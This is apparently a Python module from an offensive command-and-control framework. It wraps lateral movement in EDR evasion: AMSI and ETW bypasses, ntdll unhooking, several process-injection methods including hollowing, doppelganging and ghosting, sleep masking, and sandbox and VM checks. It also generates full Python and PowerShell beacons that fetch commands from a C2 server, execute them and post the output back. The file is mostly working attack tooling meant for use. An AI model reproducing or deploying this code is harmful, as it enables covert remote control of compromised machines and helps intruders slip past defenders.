"""
Lateral Movement Evasion Layer
Integrates evasion techniques with lateral movement for stealthy beacon deployment
Uses reflective loader, process injection, and other EDR bypass techniques
"""

import os
import time
import base64
import random
import secrets
import hashlib
import struct
import ctypes
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum

from cybermodules.helpers import log_to_intel

# Import evasion modules
try:
    from evasion.reflective_loader import ReflectiveLoader
    HAS_REFLECTIVE_LOADER = True
except ImportError:
    HAS_REFLECTIVE_LOADER = False

try:
    from evasion.process_injection import ProcessInjector
    HAS_PROCESS_INJECTION = True
except ImportError:
    HAS_PROCESS_INJECTION = False

try:
    from evasion.amsi_bypass import AMSIBypass
    HAS_AMSI_BYPASS = True
except ImportError:
    HAS_AMSI_BYPASS = False

try:
    from evasion.sleep_obfuscation import SleepObfuscation
    HAS_SLEEP_OBFUSCATION = True
except ImportError:
    HAS_SLEEP_OBFUSCATION = False

# NEW: bypass_amsi_etw modülü
try:
    from cybermodules.bypass_amsi_etw import (
        BypassManager,
        BypassLayer,
        DefenseAnalyzer,
        AMSIBypass as AMSIBypassNew,
        ETWBypass,
        IndirectSyscall,
        APIUnhooker,
        DefenseAnalysis,
        BypassResult,
    )
    HAS_BYPASS_LAYER = True
except ImportError:
    HAS_BYPASS_LAYER = False

# NEW: Sleepmask & Runtime Masking modülü
try:
    from evasion.sleep_masking import (
        SleepmaskEngine,
        SleepmaskConfig,
        SleepTechnique,
        MaskingMode,
        RuntimeMaskingCycle,
        BeaconSleepAgent,
        DripLoader,
        SleepSkipDetector,
    )
    HAS_SLEEPMASK = True
except ImportError:
    HAS_SLEEPMASK = False


class EvasionProfile(Enum):
    """Predefined evasion profiles"""
    NONE = "none"                 # No evasion - fast but detectable
    DEFAULT = "default"           # Basic evasion
    STEALTH = "stealth"          # Moderate evasion
    PARANOID = "paranoid"        # Maximum evasion - slow but very stealthy
    AGGRESSIVE = "aggressive"    # Fast with some evasion


@dataclass
class ProfileMetrics:
    """Performance and detection metrics for evasion profiles"""
    profile: EvasionProfile
    detection_risk: float         # 0.0 - 1.0 (probability of detection)
    speed_multiplier: float       # 1.0 = baseline, higher = slower
    stealth_score: float          # 0.0 - 1.0 (higher = stealthier)
    reliability: float            # 0.0 - 1.0 (higher = more reliable)
    recommended_for: List[str] = field(default_factory=list)
    not_recommended_for: List[str] = field(default_factory=list)
    
    def get_summary(self) -> str:
        """Get human-readable summary for AI guidance"""
        reduction = int((1 - self.detection_risk) * 100)
        return (f"Profile {self.profile.value}: {reduction}% detection reduction, "
                f"{self.speed_multiplier}x slower, reliability {self.reliability:.0%}")


PROFILE_METRICS = {
    EvasionProfile.NONE: ProfileMetrics(
        profile=EvasionProfile.NONE,
        detection_risk=0.95,
        speed_multiplier=1.0,
        stealth_score=0.05,
        reliability=0.99,
        recommended_for=["Lab testing", "Debugging"],
        not_recommended_for=["Production", "Any monitored network"]
    ),
    EvasionProfile.DEFAULT: ProfileMetrics(
        profile=EvasionProfile.DEFAULT,
        detection_risk=0.70,
        speed_multiplier=1.2,
        stealth_score=0.30,
        reliability=0.95,
        recommended_for=["Basic AV only", "Quick tests"],
        not_recommended_for=["EDR environments", "SOC-monitored"]
    ),
    EvasionProfile.STEALTH: ProfileMetrics(
        profile=EvasionProfile.STEALTH,
        detection_risk=0.40,
        speed_multiplier=2.0,
        stealth_score=0.60,
        reliability=0.85,
        recommended_for=["Corporate networks", "Standard EDR"],
        not_recommended_for=["Advanced EDR", "Time-critical ops"]
    ),
    EvasionProfile.PARANOID: ProfileMetrics(
        profile=EvasionProfile.PARANOID,
        detection_risk=0.20,
        speed_multiplier=5.0,
        stealth_score=0.80,
        reliability=0.70,
        recommended_for=["Advanced EDR", "SOC-monitored", "High-value targets"],
        not_recommended_for=["Time-critical", "Large-scale lateral movement"]
    ),
    EvasionProfile.AGGRESSIVE: ProfileMetrics(
        profile=EvasionProfile.AGGRESSIVE,
        detection_risk=0.55,
        speed_multiplier=1.5,
        stealth_score=0.45,
        reliability=0.90,
        recommended_for=["Rapid operations", "Many targets"],
        not_recommended_for=["EDR-heavy", "Long-term access"]
    )
}


def get_profile_metrics(profile: EvasionProfile) -> ProfileMetrics:
    """Get metrics for a profile - used by AI guidance for scoring"""
    return PROFILE_METRICS.get(profile, PROFILE_METRICS[EvasionProfile.STEALTH])


@dataclass
class EvasionConfig:
    """Evasion configuration for lateral movement"""
    profile: EvasionProfile = EvasionProfile.STEALTH
    
    # Reflective loading - Cobalt Strike 4.11 sRDI style
    use_reflective_loader: bool = True
    reflective_technique: str = "srdi"  # srdi, module_stomping, transacted_hollowing
    srdi_obfuscate_imports: bool = True
    srdi_clear_header: bool = True
    srdi_stomp_pe: bool = False
    prepend_migrate: bool = True  # Cobalt Strike style prepend
    
    # Process injection - Extended techniques
    use_process_injection: bool = True
    injection_technique: str = "thread_hijacking"  # thread_hijacking, apc_injection, early_bird, process_hollowing, doppelganging, ghosting
    target_process: str = "explorer.exe"
    fallback_processes: List[str] = field(default_factory=lambda: ["RuntimeBroker.exe", "sihost.exe"])
    use_process_hollowing: bool = False
    use_doppelganging: bool = False
    use_ghosting: bool = False
    ppid_spoof: bool = False
    ppid_target: str = "explorer.exe"
    syscall_mode: str = "indirect"  # indirect, direct, ntdll
    
    # AMSI/ETW bypass - YENİ bypass_layer sistemi
    bypass_amsi: bool = True
    amsi_technique: str = "hardware_breakpoint"  # patch_amsi_init, hardware_breakpoint, patch_amsi_scan_buffer
    bypass_etw: bool = True
    unhook_ntdll: bool = True
    unhook_technique: str = "map_fresh_ntdll"
    
    # NEW: bypass_layer config (YAML'dan gelir)
    bypass_layer: str = "both"  # none, amsi, etw, both
    use_indirect_syscalls: bool = True  # SysWhispers3 style
    auto_detect_defenses: bool = True  # AI için defense analysis
    
    # Sleep/timing with entropy
    use_sleep_obfuscation: bool = True
    sleep_technique: str = "ekko"  # ekko, foliage, death_sleep
    jitter_percent: float = 0.3
    min_sleep_ms: int = 1000
    max_sleep_ms: int = 5000
    entropy_jitter: bool = True  # Add entropy to sleep
    entropy_pool_size: int = 64
    use_hardware_entropy: bool = False  # RDRAND if available
    reencrypt_on_wake: bool = True  # Decrypt-run-reencrypt cycle
    memory_guard_on_sleep: bool = False  # PAGE_NOACCESS when sleeping
    
    # NEW: Sleepmask & Runtime Masking (Cobalt Strike Beacon tarzı)
    use_sleepmask: bool = False  # Default: paranoid profile için True
    sleepmask_technique: str = "ekko"  # ekko, foliage, death_sleep, zilean
    sleepmask_masking_mode: str = "xor"  # xor, rc4, chacha20
    sleepmask_encrypt_heap: bool = True
    sleepmask_set_noaccess: bool = True  # PAGE_NOACCESS during sleep
    sleepmask_check_sleep_skip: bool = True  # Detect EDR sleep skip
    
    # NEW: Drip-loader (slow memory loading)
    use_drip_loader: bool = False  # Yavaş memory yükleme
    drip_chunk_size: int = 4096
    drip_delay_ms: int = 100
    
    # Traffic obfuscation
    encrypt_traffic: bool = True
    encryption_key: str = ""
    encryption_algorithm: str = "aes256"  # xor, aes256, chacha20
    key_rotation_interval: int = 3600
    use_domain_fronting: bool = False
    
    # Anti-analysis
    detect_sandbox: bool = True
    detect_debugger: bool = True
    check_vm: bool = True
    exit_on_detection: bool = False


class LateralEvasionLayer:
    """
    Evasion layer for lateral movement operations
    Wraps lateral movement with various evasion techniques
    """
    
    def __init__(self, scan_id: int = 0, config: EvasionConfig = None):
        self.scan_id = scan_id
        self.config = config or EvasionConfig()
        
        # Initialize evasion modules
        self.reflective_loader = None
        self.process_injector = None
        self.amsi_bypass = None
        self.sleep_obfuscator = None
        
        # NEW: bypass_amsi_etw entegrasyonu
        self.bypass_manager = None
        self.defense_analysis: Optional[DefenseAnalysis] = None
        
        # NEW: Sleepmask engine
        self.sleepmask_engine = None
        self.runtime_masking = None
        self.drip_loader = None
        
        self._init_evasion_modules()
    
    def _init_evasion_modules(self):
        """Initialize available evasion modules"""
        
        if HAS_REFLECTIVE_LOADER and self.config.use_reflective_loader:
            try:
                self.reflective_loader = ReflectiveLoader()
                self._log("Reflective loader initialized")
            except Exception as e:
                self._log(f"Failed to init reflective loader: {e}")
        
        if HAS_PROCESS_INJECTION and self.config.use_process_injection:
            try:
                self.process_injector = ProcessInjector()
                self._log("Process injector initialized")
            except Exception as e:
                self._log(f"Failed to init process injector: {e}")
        
        if HAS_AMSI_BYPASS and self.config.bypass_amsi:
            try:
                self.amsi_bypass = AMSIBypass()
                self._log("AMSI bypass initialized")
            except Exception as e:
                self._log(f"Failed to init AMSI bypass: {e}")
        
        if HAS_SLEEP_OBFUSCATION and self.config.use_sleep_obfuscation:
            try:
                self.sleep_obfuscator = SleepObfuscation()
                self._log("Sleep obfuscation initialized")
            except Exception as e:
                self._log(f"Failed to init sleep obfuscation: {e}")
        
        # NEW: bypass_amsi_etw modülü
        if HAS_BYPASS_LAYER:
            try:
                bypass_config = {
                    "bypass_layer": self.config.bypass_layer,
                    "use_indirect_syscalls": self.config.use_indirect_syscalls,
                }
                self.bypass_manager = BypassManager(bypass_config)
                self._log(f"Bypass manager initialized (layer: {self.config.bypass_layer})")
            except Exception as e:
                self._log(f"Failed to init bypass manager: {e}")
        
        # NEW: Sleepmask & Runtime Masking
        if HAS_SLEEPMASK and self.config.use_sleepmask:
            try:
                # SleepTechnique mapping
                technique_map = {
                    "ekko": SleepTechnique.EKKO,
                    "foliage": SleepTechnique.FOLIAGE,
                    "death_sleep": SleepTechnique.DEATH_SLEEP,
                    "zilean": SleepTechnique.ZILEAN,
                }
                mode_map = {
                    "xor": MaskingMode.XOR,
                    "rc4": MaskingMode.RC4,
                    "chacha20": MaskingMode.CHACHA20,
                }
                
                sleepmask_config = SleepmaskConfig(
                    technique=technique_map.get(self.config.sleepmask_technique, SleepTechnique.EKKO),
                    masking_mode=mode_map.get(self.config.sleepmask_masking_mode, MaskingMode.XOR),
                    min_sleep_ms=self.config.min_sleep_ms,
                    max_sleep_ms=self.config.max_sleep_ms,
                    jitter_percent=self.config.jitter_percent,
                    encrypt_heap=self.config.sleepmask_encrypt_heap,
                    set_noaccess=self.config.sleepmask_set_noaccess,
                    check_sleep_skip=self.config.sleepmask_check_sleep_skip,
                    use_drip_loader=self.config.use_drip_loader,
                    drip_chunk_size=self.config.drip_chunk_size,
                    drip_delay_ms=self.config.drip_delay_ms,
                )
                
                self.sleepmask_engine = SleepmaskEngine(sleepmask_config)
                self.runtime_masking = RuntimeMaskingCycle(self.sleepmask_engine)
                
                if self.config.use_drip_loader:
                    self.drip_loader = DripLoader(
                        self.config.drip_chunk_size,
                        self.config.drip_delay_ms
                    )
                
                self._log(f"Sleepmask initialized (technique: {self.config.sleepmask_technique})")
            except Exception as e:
                self._log(f"Failed to init sleepmask: {e}")
    
    def analyze_target_defenses(self) -> Optional[Dict[str, Any]]:
        """
        Hedef sistemdeki savunmaları analiz et
        AI lateral_guide entegrasyonu için
        
        Returns:
            Dict: Defense analysis sonuçları
        """
        if not self.bypass_manager:
            return None
            
        try:
            self.defense_analysis = self.bypass_manager.analyze()
            
            return {
                "amsi_present": self.defense_analysis.amsi_present,
                "amsi_version": self.defense_analysis.amsi_version,
                "amsi_hooked": self.defense_analysis.amsi_hooked,
                "etw_enabled": self.defense_analysis.etw_enabled,
                "etw_providers": self.defense_analysis.etw_providers,
                "edr_detected": self.defense_analysis.edr_detected,
                "kernel_callbacks": self.defense_analysis.kernel_callbacks,
                "recommended_bypass": self.defense_analysis.recommended_bypass.value,
                "risk_score": self.defense_analysis.risk_score,
                "notes": self.defense_analysis.notes,
            }
        except Exception as e:
            self._log(f"Defense analysis error: {e}")
            return None
    
    def execute_bypass_layer(self, layer: Optional[str] = None) -> List[Dict]:
        """
        AMSI/ETW bypass uygula
        
        Args:
            layer: "none", "amsi", "etw", "both" (None = config'den)
        
        Returns:
            List[Dict]: Bypass sonuçları
        """
        if not self.bypass_manager:
            return []
            
        try:
            bypass_layer = BypassLayer(layer or self.config.bypass_layer)
            results = self.bypass_manager.execute_bypass(bypass_layer)
            
            return [
                {
                    "success": r.success,
                    "method": r.method.name,
                    "target": r.target,
                    "details": r.details,
                    "detection_risk": r.detection_risk,
                    "artifacts": r.artifacts,
                }
                for r in results
            ]
        except Exception as e:
            self._log(f"Bypass execution error: {e}")
            return []
    
    def prepare_for_lateral_movement(self, target_info: Dict = None) -> Dict[str, Any]:
        """
        Lateral movement öncesi tam hazırlık
        
        Args:
            target_info: Hedef bilgileri (hostname, has_edr, etc.)
        
        Returns:
            Dict: Hazırlık durumu
        """
        result = {
            "defense_analysis": None,
            "bypass_results": [],
            "ready": False,
            "warnings": [],
        }
        
        if not self.bypass_manager:
            result["warnings"].append("Bypass manager not available")
            result["ready"] = True  # Continue without bypass
            return result
        
        try:
            # 1. Defense analizi
            result["defense_analysis"] = self.analyze_target_defenses()
            
            # 2. Risk değerlendirme
            target_has_edr = target_info.get("has_edr", True) if target_info else True
            
            if self.defense_analysis and (target_has_edr or self.defense_analysis.risk_score > 50):
                # 3. Bypass uygula
                result["bypass_results"] = self.execute_bypass_layer()
                
                # 4. Başarı kontrolü
                if result["bypass_results"]:
                    success_count = sum(1 for r in result["bypass_results"] if r["success"])
                    result["ready"] = success_count > 0
                    
                    if success_count < len(result["bypass_results"]):
                        result["warnings"].append(f"Some bypasses failed: {len(result['bypass_results']) - success_count}")
                else:
                    result["ready"] = True
            else:
                result["ready"] = True
                result["warnings"].append("Low risk - skipping bypass")
                
        except Exception as e:
            result["warnings"].append(f"Preparation error: {e}")
            result["ready"] = True  # Continue anyway
            
        return result
    
    # ============================================================
    # SLEEPMASK & RUNTIME MASKING METHODS
    # ============================================================
    
    def masked_sleep(self, sleep_ms: int = None, regions: List[Tuple[int, int]] = None) -> Dict[str, Any]:
        """
        Sleepmask ile uyku - Memory encrypted during sleep
        
        Args:
            sleep_ms: Uyku süresi (ms), None = config'den
            regions: Maskelenecek memory bölgeleri [(addr, size), ...]
        
        Returns:
            Dict: Sleep sonucu (success, actual_ms, skip_detected, etc.)
        """
        if not self.sleepmask_engine:
            # Fallback: Normal sleep
            import time
            actual_sleep = sleep_ms or self.config.min_sleep_ms
            time.sleep(actual_sleep / 1000.0)
            return {
                "success": True,
                "actual_sleep_ms": actual_sleep,
                "skip_detected": False,
                "technique_used": "basic"
            }
        
        actual_sleep = sleep_ms or random.randint(
            self.config.min_sleep_ms,
            self.config.max_sleep_ms
        )
        
        result = self.sleepmask_engine.masked_sleep(actual_sleep, regions)
        
        if result.get("skip_detected"):
            self._log(f"⚠️ Sleep skip detected: {result.get('skip_reason')}")
            self._handle_sleep_anomaly(result)
        
        return result
    
    def _handle_sleep_anomaly(self, sleep_result: Dict):
        """
        Sleep anomaly tespit edildiğinde tepki
        AI guidance ile alternatif injection öner
        """
        self._log("Sleep anomaly detected - considering alternative evasion")
        
        # Alternatif sleep tekniği dene
        if self.sleepmask_engine:
            current = self.sleepmask_engine.config.technique
            alternatives = [
                SleepTechnique.DEATH_SLEEP,
                SleepTechnique.ZILEAN,
                SleepTechnique.FOLIAGE,
            ]
            
            for alt in alternatives:
                if alt != current:
                    self.sleepmask_engine.config.technique = alt
                    self._log(f"Switched to sleep technique: {alt.value}")
                    break
    
    def execute_with_masking(self, func, *args, **kwargs):
        """
        Fonksiyonu masking cycle içinde çalıştır
        decrypt → execute → re-encrypt
        
        Args:
            func: Çalıştırılacak fonksiyon
            *args, **kwargs: Argümanlar
        
        Returns:
            Fonksiyon sonucu
        """
        if not self.runtime_masking:
            return func(*args, **kwargs)
        
        return self.runtime_masking.execute_with_masking(func, *args, **kwargs)
    
    def drip_load_payload(self, payload: bytes, target_addr: int = None) -> Tuple[bool, int]:
        """
        Payload'ı yavaş yavaş memory'ye yükle (Drip-loader)
        
        Args:
            payload: Yüklenecek payload
            target_addr: Hedef adres (None = auto-allocate)
        
        Returns:
            Tuple[bool, int]: (success, loaded_address)
        """
        if not self.drip_loader:
            # Normal allocation
            import ctypes
            try:
                addr = ctypes.windll.kernel32.VirtualAlloc(
                    0, len(payload), 0x3000, 0x40
                )
                if addr:
                    ctypes.memmove(addr, payload, len(payload))
                    return True, addr
            except:
                pass
            return False, 0
        
        try:
            # Drip allocate
            if target_addr is None:
                target_addr = self.drip_loader.drip_allocate(len(payload))
            
            if not target_addr:
                return False, 0
            
            # Drip write
            def progress_cb(percent, chunks):
                if percent % 25 == 0:
                    self._log(f"Drip loading: {percent:.0f}% ({chunks} chunks)")
            
            success = self.drip_loader.drip_write(target_addr, payload, progress_cb)
            return success, target_addr if success else 0
            
        except Exception as e:
            self._log(f"Drip load error: {e}")
            return False, 0
    
    def get_sleepmask_metrics(self) -> Dict[str, Any]:
        """Sleepmask metrikleri"""
        if not self.sleepmask_engine:
            return {"enabled": False}
        
        return {
            "enabled": True,
            **self.sleepmask_engine.get_metrics()
        }
    
    def create_beacon_sleep_agent(self, c2_callback=None) -> Optional['BeaconSleepAgent']:
        """
        Test için beacon sleep agent oluştur
        
        Args:
            c2_callback: Check-in callback fonksiyonu
        
        Returns:
            BeaconSleepAgent instance
        """
        if not HAS_SLEEPMASK:
            return None
        
        return BeaconSleepAgent(
            c2_callback=c2_callback,
            config=self.sleepmask_engine.config if self.sleepmask_engine else None
        )
    
    def prepare_beacon_payload(self, beacon_type: str, beacon_config: Dict) -> bytes:
        """
        Prepare beacon payload with evasion techniques applied
        
        Args:
            beacon_type: Type of beacon (python, go, rust)
            beacon_config: Beacon configuration (c2_url, callback_interval, etc.)
        
        Returns:
            bytes: Evasion-wrapped beacon payload
        """
        
        self._log(f"Preparing {beacon_type} beacon with evasion profile: {self.config.profile.value}")
        
        # Generate base beacon
        beacon_code = self._generate_beacon(beacon_type, beacon_config)
        
        # Apply evasion based on profile
        if self.config.profile == EvasionProfile.NONE:
            return beacon_code
        
        # Stage 1: AMSI bypass (for PowerShell/C# beacons)
        if self.config.bypass_amsi:
            beacon_code = self._wrap_with_amsi_bypass(beacon_code, beacon_type)
        
        # Stage 2: Encrypt payload
        if self.config.encrypt_traffic:
            key = self.config.encryption_key or secrets.token_hex(16)
            beacon_code = self._encrypt_payload(beacon_code, key)
        
        # Stage 3: Generate reflective loader stub
        if self.config.use_reflective_loader and self.reflective_loader:
            beacon_code = self._wrap_with_reflective_loader(beacon_code)
        
        # Stage 4: Add anti-analysis checks
        if self.config.detect_sandbox or self.config.detect_debugger:
            beacon_code = self._add_anti_analysis(beacon_code, beacon_type)
        
        self._log(f"Beacon prepared: {len(beacon_code)} bytes")
        return beacon_code
    
    def prepare_lateral_command(self, command: str, target_os: str = "windows") -> str:
        """
        Prepare command for lateral movement with evasion
        
        Args:
            command: Command to execute
            target_os: Target operating system
        
        Returns:
            str: Evasion-wrapped command
        """
        
        if self.config.profile == EvasionProfile.NONE:
            return command
        
        wrapped_command = command
        
        # Windows-specific evasion
        if target_os == "windows":
            # Add AMSI bypass for PowerShell commands
            if "powershell" in command.lower() and self.config.bypass_amsi:
                amsi_bypass = self._get_amsi_bypass_oneliner()
                wrapped_command = f"{amsi_bypass}; {command}"
            
            # Obfuscate command
            if self.config.profile in [EvasionProfile.STEALTH, EvasionProfile.PARANOID]:
                wrapped_command = self._obfuscate_command(wrapped_command)
        
        return wrapped_command
    
    def inject_beacon(self, beacon_payload: bytes, target_process: str = None) -> Dict[str, Any]:
        """
        Inject beacon into target process using evasion techniques
        
        Args:
            beacon_payload: Beacon payload bytes
            target_process: Target process name (default from config)
        
        Returns:
            Dict with injection result
        """
        
        target = target_process or self.config.target_process
        technique = self.config.injection_technique
        
        self._log(f"Injecting beacon into {target} using {technique}")
        
        result = {
            'success': False,
            'technique': technique,
            'target_process': target,
            'pid': None,
            'error': None
        }
        
        if not self.process_injector:
            result['error'] = "Process injector not available"
            return result
        
        try:
            # Select injection technique based on profile
            if technique == "thread_hijacking":
                pid = self.process_injector.thread_execution_hijacking(
                    beacon_payload, target
                )
            elif technique == "apc_injection":
                pid = self.process_injector.queue_user_apc_injection(
                    beacon_payload, target
                )
            elif technique == "early_bird":
                pid = self.process_injector.early_bird_injection(
                    beacon_payload, target
                )
            elif technique == "process_hollowing":
                pid = self._process_hollowing_inject(
                    beacon_payload, target
                )
            elif technique == "doppelganging":
                pid = self._doppelganging_inject(
                    beacon_payload, target
                )
            elif technique == "ghosting":
                pid = self._ghosting_inject(
                    beacon_payload, target
                )
            else:
                # Default: basic injection
                pid = self.process_injector.inject(beacon_payload, target)
            
            if pid:
                result['success'] = True
                result['pid'] = pid
                self._log(f"Beacon injected successfully, PID: {pid}")
            else:
                result['error'] = "Injection returned no PID"
                
        except Exception as e:
            result['error'] = str(e)
            self._log(f"Injection failed: {e}")
        
        return result
    
    def _process_hollowing_inject(self, payload: bytes, target: str) -> Optional[int]:
        """
        Process Hollowing (T1055.012)
        Create suspended process, hollow it out, inject shellcode
        """
        self._log(f"Process hollowing into {target}")
        
        # This is a simplified version - real implementation would use Windows API
        hollowing_stub = f'''
# Process Hollowing Stub
import ctypes
import struct

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# Create suspended process
STARTUPINFO = ctypes.create_string_buffer(68)
PROCESS_INFORMATION = ctypes.create_string_buffer(16)

kernel32.CreateProcessA(
    None,
    b"{target}",
    None, None, False,
    0x4,  # CREATE_SUSPENDED
    None, None,
    ctypes.byref(STARTUPINFO),
    ctypes.byref(PROCESS_INFORMATION)
)

# Unmap original image and write shellcode
hProcess = struct.unpack("<I", PROCESS_INFORMATION[:4])[0]
hThread = struct.unpack("<I", PROCESS_INFORMATION[4:8])[0]

# Resume thread
kernel32.ResumeThread(hThread)
'''
        if self.process_injector:
            try:
                return self.process_injector.process_hollowing(payload, target)
            except AttributeError:
                self._log("Process hollowing not available in injector, using fallback")
                return self.process_injector.inject(payload, target)
        return None
    
    def _doppelganging_inject(self, payload: bytes, target: str) -> Optional[int]:
        """
        Process Doppelgänging (T1055.013)
        Uses NTFS transactions to inject without file on disk
        """
        self._log(f"Process doppelganging for {target}")
        
        # Simplified - uses NTFS transactions
        # 1. Create transaction
        # 2. Open file in transaction
        # 3. Write malicious content
        # 4. Create section from transacted file
        # 5. Rollback transaction (file disappears)
        # 6. Create process from section
        
        if self.process_injector:
            try:
                return self.process_injector.process_doppelganging(payload, target)
            except AttributeError:
                self._log("Doppelganging not available, falling back to hollowing")
                return self._process_hollowing_inject(payload, target)
        return None
    
    def _ghosting_inject(self, payload: bytes, target: str) -> Optional[int]:
        """
        Process Ghosting (simplified)
        Delete file before image section is closed
        """
        self._log(f"Process ghosting for {target}")
        
        # Simplified process ghosting:
        # 1. Create file
        # 2. Set delete pending
        # 3. Write payload
        # 4. Create image section
        # 5. Close file handle (file gets deleted)
        # 6. Create process from orphaned section
        
        if self.process_injector:
            try:
                return self.process_injector.process_ghosting(payload, target)
            except AttributeError:
                self._log("Ghosting not available, falling back to doppelganging")
                return self._doppelganging_inject(payload, target)
        return None
    
    def evasive_sleep(self, base_duration_ms: int = None) -> int:
        """
        Sleep with obfuscation, jitter, and entropy
        Implements decrypt-run-reencrypt cycle for paranoid mode
        
        Args:
            base_duration_ms: Base sleep duration in milliseconds
        
        Returns:
            int: Actual sleep duration
        """
        
        if base_duration_ms is None:
            base_duration_ms = random.randint(
                self.config.min_sleep_ms,
                self.config.max_sleep_ms
            )
        
        # Apply standard jitter
        jitter = int(base_duration_ms * self.config.jitter_percent)
        actual_duration = base_duration_ms + random.randint(-jitter, jitter)
        
        # Apply entropy jitter for additional randomness
        if self.config.entropy_jitter:
            entropy_adjustment = self._get_entropy_jitter()
            actual_duration = int(actual_duration * (1 + entropy_adjustment))
        
        actual_duration = max(100, actual_duration)  # Minimum 100ms
        
        # Memory protection before sleep (paranoid mode)
        memory_state = None
        if self.config.memory_guard_on_sleep:
            memory_state = self._protect_memory()
        
        # Decrypt-run-reencrypt cycle preparation
        reencrypt_key = None
        if self.config.reencrypt_on_wake:
            reencrypt_key = self._prepare_reencrypt_cycle()
        
        # Perform the sleep
        if self.config.use_sleep_obfuscation and self.sleep_obfuscator:
            technique = self.config.sleep_technique
            
            try:
                if technique == "ekko":
                    # Ekko: ROP-based sleep with memory encryption
                    self.sleep_obfuscator.ekko_sleep(actual_duration)
                elif technique == "foliage":
                    # Foliage: APC-based sleep
                    self.sleep_obfuscator.foliage_sleep(actual_duration)
                elif technique == "death_sleep":
                    # Death Sleep: Thread pool wait-based sleep
                    self.sleep_obfuscator.death_sleep(actual_duration)
                else:
                    self._entropy_sleep(actual_duration)
            except Exception:
                self._entropy_sleep(actual_duration)
        else:
            self._entropy_sleep(actual_duration)
        
        # Restore memory protection
        if memory_state:
            self._restore_memory(memory_state)
        
        # Complete reencrypt cycle
        if reencrypt_key:
            self._complete_reencrypt_cycle(reencrypt_key)
        
        return actual_duration
    
    def _get_entropy_jitter(self) -> float:
        """
        Generate entropy-based jitter using multiple sources
        Returns adjustment factor (-0.2 to +0.2)
        """
        entropy_sources = []
        
        # System entropy
        entropy_sources.append(secrets.randbits(32))
        
        # Time-based entropy
        entropy_sources.append(int(time.time() * 1000000) % (2**32))
        
        # Process-based entropy
        entropy_sources.append(os.getpid())
        
        # Hardware entropy (if available)
        if self.config.use_hardware_entropy:
            try:
                import subprocess
                result = subprocess.run(
                    ['cat', '/dev/urandom'],
                    capture_output=True,
                    timeout=0.01
                )
                if result.stdout:
                    entropy_sources.append(int.from_bytes(result.stdout[:4], 'little'))
            except Exception:
                pass
        
        # Combine entropy sources
        combined = hashlib.sha256(
            ''.join(str(e) for e in entropy_sources).encode()
        ).digest()
        
        # Convert to jitter factor (-0.2 to +0.2)
        value = struct.unpack('<I', combined[:4])[0]
        jitter = (value / (2**32) - 0.5) * 0.4
        
        return jitter
    
    def _entropy_sleep(self, duration_ms: int):
        """
        Sleep with entropy-based timing to avoid detection patterns
        """
        # Split sleep into random chunks
        remaining = duration_ms
        while remaining > 0:
            # Random chunk size (10-100ms or remaining)
            chunk = min(remaining, random.randint(10, 100))
            time.sleep(chunk / 1000)
            remaining -= chunk
            
            # Occasional micro-activity to look like normal process
            if random.random() < 0.1:
                _ = secrets.token_bytes(16)  # Minimal activity
    
    def _protect_memory(self) -> Dict:
        """Set memory protection (PAGE_NOACCESS) before sleep"""
        # Placeholder - would use VirtualProtect on Windows
        return {'protected': True, 'regions': []}
    
    def _restore_memory(self, state: Dict):
        """Restore memory protection after sleep"""
        pass  # Placeholder - would restore VirtualProtect
    
    def _prepare_reencrypt_cycle(self) -> bytes:
        """Prepare for decrypt-run-reencrypt cycle"""
        # Generate new key for reencryption
        return secrets.token_bytes(32)
    
    def _complete_reencrypt_cycle(self, new_key: bytes):
        """Complete the reencryption after waking"""
        # In real implementation, this would reencrypt beacon in memory
        self._log(f"Reencrypt cycle complete, new key hash: {hashlib.sha256(new_key).hexdigest()[:16]}")
    
    def check_environment(self) -> Dict[str, bool]:
        """
        Check environment for analysis indicators
        
        Returns:
            Dict with detection results
        """
        
        checks = {
            'sandbox_detected': False,
            'debugger_detected': False,
            'vm_detected': False,
            'safe_to_proceed': True
        }
        
        if not self.config.detect_sandbox and not self.config.detect_debugger:
            return checks
        
        # Sandbox detection
        if self.config.detect_sandbox:
            checks['sandbox_detected'] = self._detect_sandbox()
        
        # Debugger detection
        if self.config.detect_debugger:
            checks['debugger_detected'] = self._detect_debugger()
        
        # VM detection
        if self.config.check_vm:
            checks['vm_detected'] = self._detect_vm()
        
        # Determine if safe to proceed
        if self.config.profile == EvasionProfile.PARANOID:
            checks['safe_to_proceed'] = not any([
                checks['sandbox_detected'],
                checks['debugger_detected'],
                checks['vm_detected']
            ])
        elif self.config.profile == EvasionProfile.STEALTH:
            checks['safe_to_proceed'] = not any([
                checks['sandbox_detected'],
                checks['debugger_detected']
            ])
        
        return checks
    
    def _generate_beacon(self, beacon_type: str, config: Dict) -> bytes:
        """Generate beacon code based on type"""
        
        c2_url = config.get('c2_url', 'https://localhost:8443')
        interval = config.get('callback_interval', 60)
        jitter = config.get('jitter', 0.2)
        
        if beacon_type == "python":
            code = f'''
import time
import random
import requests
import platform
import subprocess

class Beacon:
    def __init__(self):
        self.c2 = "{c2_url}"
        self.interval = {interval}
        self.jitter = {jitter}
        self.id = "{secrets.token_hex(8)}"
    
    def callback(self):
        try:
            headers = {{"User-Agent": "Mozilla/5.0", "X-Beacon-ID": self.id}}
            r = requests.get(f"{{self.c2}}/beacon/{{self.id}}", headers=headers, timeout=30)
            if r.status_code == 200:
                cmd = r.json().get("command")
                if cmd:
                    out = subprocess.check_output(cmd, shell=True, timeout=60)
                    requests.post(f"{{self.c2}}/beacon/{{self.id}}/result", 
                                 json={{"output": out.decode()}}, headers=headers)
        except Exception:
            pass
    
    def run(self):
        while True:
            self.callback()
            sleep_time = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

if __name__ == "__main__":
    Beacon().run()
'''
            return code.encode()
        
        elif beacon_type == "powershell":
            code = f'''
$c2 = "{c2_url}"
$interval = {interval}
$id = "{secrets.token_hex(8)}"

while($true) {{
    try {{
        $r = Invoke-WebRequest -Uri "$c2/beacon/$id" -Headers @{{"X-Beacon-ID"=$id}} -UseBasicParsing
        if($r.StatusCode -eq 200) {{
            $cmd = ($r.Content | ConvertFrom-Json).command
            if($cmd) {{
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                Invoke-WebRequest -Uri "$c2/beacon/$id/result" -Method POST -Body (@{{output=$out}} | ConvertTo-Json) -ContentType "application/json"
            }}
        }}
    }} catch {{}}
    Start-Sleep -Seconds ($interval + (Get-Random -Minimum (-$interval*{jitter}) -Maximum ($interval*{jitter})))
}}
'''
            return code.encode()
        
        else:
            # Generic shellcode placeholder
            return b"\x90" * 100  # NOP sled placeholder
    
